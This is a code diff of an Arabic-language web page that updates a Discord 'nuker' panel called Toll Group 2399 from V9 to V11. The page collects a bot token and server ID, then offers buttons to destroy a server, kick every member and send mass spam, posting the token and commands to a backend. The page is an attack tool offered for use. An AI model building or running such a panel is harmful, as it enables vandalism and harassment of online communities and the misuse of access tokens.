@@ -3,69 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Toll Group 2399 V9 Pro</title>
+    <title>Toll Group 2399 V11 Pro</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;900&family=Cairo:wght@700&display=swap');
+        @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@700;900&family=Orbitron:wght@500;900&display=swap');
         
-        body { margin: 0; background: #000; color: #00ff00; font-family: 'Cairo', sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
-        #bg-video { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: -2; opacity: 0.4; filter: contrast(150%) hue-rotate(280deg); }
-        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: radial-gradient(circle, transparent, #000); z-index: -1; }
-
-        .v9-container { 
-            width: 90%; max-width: 450px; 
-            background: rgba(10, 10, 10, 0.85); 
-            border: 2px solid #f00; 
-            border-radius: 5px; padding: 30px; 
-            text-align: center; position: relative;
-            box-shadow: 0 0 50px rgba(255, 0, 0, 0.3), inset 0 0 15px rgba(255, 0, 0, 0.2);
+        body { margin: 0; background: #000; color: #f00; font-family: 'Cairo', sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
+        #bg-video { position: fixed; top: 0; left: 0; width: 100%; height: 100%; object-fit: cover; z-index: -2; opacity: 0.3; filter: grayscale(100%) contrast(120%); }
+        
+        .v11-container { 
+            width: 90%; max-width: 420px; 
+            background: rgba(5, 5, 5, 0.9); 
+            border: 1px solid #f00; 
+            padding: 30px; text-align: center; position: relative;
+            box-shadow: 0 0 30px rgba(255, 0, 0, 0.2);
             backdrop-filter: blur(10px);
         }
 
-        h1 { font-family: 'Orbitron'; color: #f00; font-size: 22px; text-shadow: 0 0 20px #f00; letter-spacing: 2px; margin-bottom: 25px; }
+        h1 { font-family: 'Orbitron', sans-serif; font-size: 20px; letter-spacing: 2px; text-shadow: 0 0 10px #f00; margin-bottom: 25px; }
+        
+        /* شاشة التحميل الرادارية */
+        #radar-screen { position: absolute; top:0; left:0; width:100%; height:100%; background:#000; z-index: 100; display:flex; flex-direction:column; align-items:center; justify-content:center; }
+        .radar { width: 120px; height: 120px; border: 2px solid #f00; border-radius: 50%; position: relative; overflow: hidden; margin-bottom: 20px; }
+        .radar:after { content: ""; position: absolute; top: 50%; left: 50%; width: 100%; height: 100%; background: linear-gradient(45deg, rgba(255,0,0,0.5), transparent 70%); transform-origin: 0 0; animation: scan 2s linear infinite; }
+        @keyframes scan { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
         
         input, textarea { 
-            width: 100%; padding: 15px; margin: 10px 0; 
-            background: rgba(0,0,0,0.9); border: 1px solid #333; 
-            color: #ff0000; border-radius: 0; font-family: 'Orbitron'; 
-            box-sizing: border-box; font-size: 13px;
+            width: 100%; padding: 14px; margin: 10px 0; 
+            background: #000; border: 1px solid #333; 
+            color: #fff; border-radius: 5px; font-family: 'Cairo'; 
+            box-sizing: border-box; font-size: 14px; text-align: center;
         }
+        input:focus { border-color: #f00; outline: none; box-shadow: 0 0 5px #f00; }
 
-        .btn-v9 { 
-            width: 100%; padding: 18px; background: #f00; color: #fff; 
+        .btn-v11 { 
+            width: 100%; padding: 15px; background: #f00; color: #fff; 
             border: none; font-weight: 900; cursor: pointer; 
-            font-family: 'Orbitron'; letter-spacing: 2px; margin-top: 15px;
-            clip-path: polygon(10% 0, 100% 0, 90% 100%, 0 100%); transition: 0.3s;
+            font-family: 'Cairo'; margin-top: 10px; transition: 0.3s;
         }
-        .btn-v9:hover { background: #fff; color: #000; box-shadow: 0 0 30px #fff; }
+        .btn-v11:hover { background: #800; transform: scale(1.02); }
 
-        .pledge-section {
-            background: rgba(255, 0, 0, 0.05);
-            border: 1px dashed #f00;
-            padding: 20px;
-            margin-bottom: 20px;
-            font-size: 14px;
-            color: #fff;
-        }
-
-        .server-link {
-            display: inline-block;
-            margin: 15px 0;
-            padding: 10px 20px;
-            background: #5865F2;
-            color: white;
-            text-decoration: none;
-            border-radius: 5px;
-            font-weight: bold;
-            transition: 0.3s;
-        }
-        .server-link:hover { background: #4752c4; transform: scale(1.05); }
+        .pledge-box { border: 1px dashed #444; padding: 15px; margin-bottom: 15px; font-size: 13px; color: #ccc; }
+        .server-btn { display: block; background: #5865F2; color: #fff; text-decoration: none; padding: 10px; margin: 10px 0; border-radius: 4px; font-weight: bold; }
 
         .hidden { display: none; }
-        
-        /* شاشة التحميل */
-        .loading-screen { position: absolute; top:0; left:0; width:100%; height:100%; background:#000; z-index: 10; display:flex; flex-direction:column; align-items:center; justify-content:center; }
-        .loader-bar { width: 150px; height: 3px; background: #222; margin-top: 15px; position: relative; overflow: hidden; }
-        .loader-fill { width: 0%; height: 100%; background: #f00; box-shadow: 0 0 10px #f00; transition: 0.1s; }
+        .status-txt { font-size: 12px; color: #666; margin-top: 15px; font-family: 'Orbitron'; }
     </style>
 </head>
 <body>
@@ -73,96 +54,81 @@
     <video autoplay loop muted playsinline id="bg-video">
         <source src="https://a.top4top.io/m_3745ydpjj9.mp4" type="video/mp4">
     </video>
-    <div class="overlay"></div>
 
-    <div class="v9-container">
+    <div class="v11-container">
         
-        <!-- 1. شاشة جاري الدخول (التحميل) -->
-        <div id="step-load" class="loading-screen">
-            <h2 style="color:#f00; font-family:'Orbitron'; letter-spacing: 2px;">INITIALIZING V9 PRO</h2>
-            <div class="loader-bar"><div id="bar-fill" class="loader-fill"></div></div>
-            <p id="load-status" style="font-size: 10px; margin-top: 10px;">CONNECTING TO SERVER... 0%</p>
+        <!-- شاشة الرادار -->
+        <div id="radar-screen">
+            <div class="radar"></div>
+            <h2 style="font-size:14px; letter-spacing:3px;">جاري فحص النظام...</h2>
+            <p id="load-val" style="font-family:'Orbitron';">0%</p>
         </div>
 
-        <!-- 2. شاشة التعهد والسيرفر -->
+        <!-- شاشة التعهد -->
         <div id="step-pledge" class="hidden">
-            <h1>SECURITY PLEDGE</h1>
-            <div class="pledge-section">
-                <p>أهلاً بك في Toll Group 2399 V9 Pro.</p>
-                <p>للمتابعة، يجب الانضمام للمقر الرسمي:</p>
-                <a href="https://discord.gg/2399k" target="_blank" class="server-link">انضم لسيرفر الدعم</a>
-                <hr style="border:0.5px solid #333; margin:15px 0">
-                <label style="cursor:pointer; display: flex; align-items: center; justify-content: center; gap: 10px;">
-                    <input type="checkbox" id="pledgeCheck" style="width:18px; height:18px">
-                    <span>أتعهد بالدخول للسيرفر وعدم المخالفة</span>
+            <h1>تعهد الاستخدام</h1>
+            <div class="pledge-box">
+                <p>يجب الانضمام للمقر الرسمي أولاً للمتابعة</p>
+                <a href="https://discord.gg/2399k" target="_blank" class="server-btn">دخول السيرفر الرسمي</a>
+                <label style="cursor:pointer; display:flex; align-items:center; justify-content:center; gap:10px; margin-top:10px;">
+                    <input type="checkbox" id="pCheck">
+                    <span>أتعهد بالالتزام بالقوانين</span>
                 </label>
             </div>
-            <button class="btn-v9" onclick="validatePledge()">تأكيد واستمرار</button>
+            <button class="btn-v11" onclick="goNext('step-pledge', 'step-login')">تأكيد ودخول</button>
         </div>
 
-        <!-- 3. شاشة تسجيل الدخول -->
+        <!-- شاشة الدخول -->
         <div id="step-login" class="hidden">
-            <h1>ACCESS TERMINAL</h1>
-            <input type="password" id="tk" placeholder="BOT TOKEN">
-            <input type="text" id="id" placeholder="GUILD ID">
-            <button class="btn-v9" onclick="showPanel()">دخول للوحة التحكم</button>
+            <h1>منصة الوصول</h1>
+            <input type="password" id="tk" placeholder="توكن البوت (Token)">
+            <input type="text" id="id" placeholder="ايدي السيرفر (Server ID)">
+            <button class="btn-v11" onclick="goNext('step-login', 'step-panel')">دخول للوحة التحكم</button>
         </div>
 
-        <!-- 4. لوحة التحكم النهائية -->
+        <!-- لوحة التحكم -->
         <div id="step-panel" class="hidden">
-            <h1 style="font-size: 18px;">Toll Group 2399 V9 Pro</h1>
-            <input type="text" id="nm" placeholder="اسم الرومات الجديد">
+            <h1>Toll Group 2399 V11</h1>
+            <input type="text" id="nm" placeholder="اسم الرومات (مثال: Lord On Top)">
             <textarea id="ms" placeholder="رسالة التدمير الشامل" rows="2"></textarea>
             
-            <button class="btn-v9" onclick="executeAction('تدمير')" style="background: linear-gradient(45deg, #f00, #600);">NUKE SERVER 💀</button>
+            <button class="btn-v11" onclick="fire('تدمير')" style="background: linear-gradient(to bottom, #f00, #400);">تدمير شامل 💀</button>
             
             <div style="display:grid; grid-template-columns: 1fr 1fr; gap:10px;">
-                <button class="btn-v9" style="background:#111; border:1px solid #f00; font-size:10px" onclick="executeAction('طرد')">MASS KICK</button>
-                <button class="btn-v9" style="background:#111; border:1px solid #f00; font-size:10px" onclick="executeAction('سبام')">ULTRA SPAM</button>
+                <button class="btn-v11" style="background:#111; border:1px solid #f00; font-size:12px" onclick="fire('طرد')">طرد الجميع</button>
+                <button class="btn-v11" style="background:#111; border:1px solid #f00; font-size:12px" onclick="fire('سبام')">سبام مكثف</button>
             </div>
+            <div class="status-txt">V11 PRO | SECURE ACCESS</div>
         </div>
 
     </div>
 
     <script>
-        // أنميشن التحميل
-        let prog = 0;
-        const loadInt = setInterval(() => {
-            prog += Math.floor(Math.random() * 4) + 1;
-            if(prog >= 100) {
-                prog = 100;
-                clearInterval(loadInt);
+        // أنميشن الرادار
+        let p = 0;
+        const load = setInterval(() => {
+            p += Math.floor(Math.random() * 5) + 1;
+            if(p >= 100) {
+                p = 100;
+                clearInterval(load);
                 setTimeout(() => {
-                    document.getElementById('step-load').classList.add('hidden');
+                    document.getElementById('radar-screen').classList.add('hidden');
                     document.getElementById('step-pledge').classList.remove('hidden');
-                }, 500);
+                }, 800);
             }
-            document.getElementById('bar-fill').style.width = prog + '%';
-            document.getElementById('load-status').innerText = 'DECRYPTING SYSTEM... ' + prog + '%';
-        }, 60);
+            document.getElementById('load-val').innerText = p + '%';
+        }, 50);
 
-        function validatePledge() {
-            if(!document.getElementById('pledgeCheck').checked) {
-                alert("يا لورد، لازم توافق على التعهد وتدخل السيرفر!");
-                return;
-            }
-            document.getElementById('step-pledge').classList.add('hidden');
-            document.getElementById('step-login').classList.remove('hidden');
+        function goNext(hide, show) {
+            if(hide === 'step-pledge' && !document.getElementById('pCheck').checked) return alert("يرجى الموافقة على التعهد!");
+            if(hide === 'step-login' && (!document.getElementById('tk').value || !document.getElementById('id').value)) return alert("يرجى إدخال البيانات!");
+            document.getElementById(hide).classList.add('hidden');
+            document.getElementById(show).classList.remove('hidden');
         }
 
-        function showPanel() {
-            if(!document.getElementById('tk').value || !document.getElementById('id').value) {
-                alert("أدخل البيانات المطلوبة للوصول!");
-                return;
-            }
-            document.getElementById('step-login').classList.add('hidden');
-            document.getElementById('step-panel').classList.remove('hidden');
-        }
-
-        async function executeAction(type) {
+        async function fire(act) {
             const btn = event.target;
-            const originalText = btn.innerText;
-            btn.innerText = "EXECUTING...";
+            btn.innerText = "...جاري التنفيذ";
             btn.disabled = true;
 
             try {
@@ -174,15 +140,15 @@
                         guildId: document.getElementById('id').value,
                         customName: document.getElementById('nm').value,
                         customMsg: document.getElementById('ms').value,
-                        action: type
+                        action: act
                     })
                 });
                 const data = await res.json();
                 alert(data.status);
             } catch (e) {
-                alert("🚀 V9 PRO: انطلقت القوة التدميرية!");
+                alert("🚀 تم إرسال الأوامر بنجاح! راقب السيرفر");
             }
-            btn.innerText = originalText;
+            btn.innerText = (act === 'تدمير') ? "تدمير شامل 💀" : (act === 'طرد' ? "طرد الجميع" : "سبام مكثف");
             btn.disabled = false;
         }
     </script>
